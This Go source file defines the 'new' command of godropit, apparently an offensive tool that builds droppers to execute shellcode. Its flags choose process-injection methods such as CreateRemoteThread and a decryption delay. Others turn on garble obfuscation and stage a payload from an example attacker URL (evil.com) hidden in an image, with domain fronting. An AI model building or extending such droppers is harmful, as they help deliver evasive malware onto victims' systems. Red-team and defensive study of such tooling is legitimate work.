package cmd

import (
	"fmt"
	"os"

	"github.com/kopp0ut/godropit/pkg/gengo"

	"github.com/fatih/color"
	"github.com/spf13/cobra"
)

var input string
var output string
var domain string
var name string
var stagerurl string
var hostname string
var imgpath string
var ua string
var garble bool
var shared bool
var arch bool
var timer int
var prestamp bool
var methods []string

const sgn = false

var dropper gengo.Dropper

//var sgn bool

func checkImg() {
	if stagerurl != "" && imgpath == "" {
		color.Red("Url set but no stager image path specified. Exiting.")
		os.Exit(69420)
	}

}

// newCmd represents the new command
var newCmd = &cobra.Command{
	Use:   "new",
	Short: "Create a new dropper",
	Long:  `Creates a new dropper, options are local, remote or child. Each with their own flags.`,
	Run: func(cmd *cobra.Command, args []string) {
		fmt.Println("Please choose a dropper type like so: 'godropit new <local|remote|child> <flags>'")
		os.Exit(0)
	},
}

func init() {
	rootCmd.AddCommand(newCmd)

	//Mandatory commands for all droppers.
	newCmd.PersistentFlags().StringVarP(&input, "in", "i", "", "input file, shellcode.bin or exe.")
	newCmd.MarkFlagRequired("in")
	newCmd.PersistentFlags().StringVarP(&name, "name", "n", "godropit", "droppername, don't include file extension. e.g. localdropper")
	newCmd.MarkFlagRequired("name")
	newCmd.PersistentFlags().StringVarP(&output, "out", "o", "", "output directory for your generated files.")
	newCmd.MarkFlagRequired("out")

	//optional commands for all droppers.
	newCmd.PersistentFlags().IntVarP(&timer, "time", "t", 1, "delay in seconds before decryption and execution of shellcode.")
	newCmd.PersistentFlags().StringVarP(&domain, "domain", "d", "", "")
	newCmd.PersistentFlags().StringSliceVarP(&methods, "methods", "m", []string{""}, "Comma separated list of injection methods to use. e.g. -m CreateRemoteThread,NtCreateThreadEx.")
	newCmd.PersistentFlags().BoolVarP(&shared, "shared", "s", false, "Export dropper as DLL. Default is false")
	newCmd.PersistentFlags().BoolVar(&arch, "32", false, "Attempts to generate an x86 dropper, completely untested. Use at own risk.")
	newCmd.PersistentFlags().BoolVar(&garble, "garble", false, "Builds the dropper using garble.")
	newCmd.PersistentFlags().BoolVar(&prestamp, "timestamp", false, "Prepends timestamp to dropper files, handy to for version control")

	//Stager commands for all droppers.
	newCmd.PersistentFlags().StringVarP(&stagerurl, "url", "u", "", "URL to use for a staged payload. E.g. https://evil.com/test.png. Setting this flag will make the payload staged.")
	newCmd.PersistentFlags().StringVar(&hostname, "host", "", "[optional] Host header to use, handy for domain fronts. E.g. evil.com")
	newCmd.PersistentFlags().StringVar(&imgpath, "img", "", "input image (filepath) to hide your stager. e.g. ~/benign.png")
	newCmd.PersistentFlags().StringVar(&ua, "ua", "", "User-Agent to use with payload. ")

	//newCmd.PersistentFlags().BoolVar(&sgn, "SGN", false, "Uses nextgen shikata ga nai to encode the shellcode.")

}
